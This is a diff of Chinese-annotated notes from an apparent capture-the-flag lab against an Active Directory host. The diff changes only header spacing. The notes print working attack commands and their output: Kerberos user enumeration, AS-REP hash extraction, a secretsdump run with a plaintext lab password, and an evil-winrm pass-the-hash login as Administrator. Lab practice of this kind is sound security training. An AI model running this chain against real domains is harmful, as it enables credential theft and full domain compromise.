@@ -1,5 +1,5 @@
-#nmap
-└─# nmap -sV 10.10.193.27
+# nmap
+└─#  nmap -sV 10.10.193.27
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-19 03:25 EDT
 Nmap scan report for 10.10.193.27
 Host is up (0.31s latency).
@@ -24,8 +24,8 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 40.99 seconds
 
 
-#enum4linux
-└─# enum4linux 10.10.193.27  
+# enum4linux
+└─#  enum4linux 10.10.193.27  
 Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Thu Aug 19 03:34:05 2021
 
  ========================== 
@@ -137,10 +137,10 @@ Use of uninitialized value $global_workgroup in concatenation (.) or string at .
 [+] Getting domain group memberships:
 
 
-#kerbrute
+# kerbrute
 ./kerbrute userenum -d spookysec.local  --dc spookysec.local /root/
 
-└─# ./kerbrute userenum -d spookysec.local  --dc spookysec.local /root/Attacktive/user.txt
+└─#  ./kerbrute userenum -d spookysec.local  --dc spookysec.local /root/Attacktive/user.txt
 
     __             __               __     
    / /_____  _____/ /_  _______  __/ /____ 
@@ -165,8 +165,8 @@ Version: v1.0.3 (9dad6e1) - 08/19/21 - Ronnie Flathers @ropnop
 2021/08/19 04:02:58 >  [+] VALID USERNAME:       Robin@spookysec.local
 
 
-#获取哈希密码
-└─# python3 GetNPUsers.py -dc-ip spookysec.local spookysec.local/svc-admin -no-pass                                                                                                                                                     1 ⨯
+# 获取哈希密码
+└─#  python3 GetNPUsers.py -dc-ip spookysec.local spookysec.local/svc-admin -no-pass                                                                                                                                                     1 ⨯
 Impacket v0.9.24.dev1+20210814.5640.358fc7c6 - Copyright 2021 SecureAuth Corporation
 
 [*] Getting TGT for svc-admin
@@ -174,8 +174,8 @@ $krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:2cacc3d363356a69dea6e99d782cdffa$a37c45e
 
 
 
-#hash dump
-└─# python3 secretsdump.py -dc-ip spookysec.local backup:backup2517860@spookysec.local       
+# hash dump
+└─#  python3 secretsdump.py -dc-ip spookysec.local backup:backup2517860@spookysec.local       
 
 Impacket v0.9.24.dev1+20210814.5640.358fc7c6 - Copyright 2021 SecureAuth Corporation
 
@@ -255,8 +255,8 @@ ATTACKTIVEDIREC$:des-cbc-md5:587ac498c7b95132
 
 
 
-#安装evil-winrm ： gem install evil-winrm
+# 安装evil-winrm ： gem install evil-winrm
 
 
-#根据上面的hash，连接admin账号
+# 根据上面的hash，连接admin账号
 evil-winrm -i 10.10.193.27 -u Administrator -p aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc
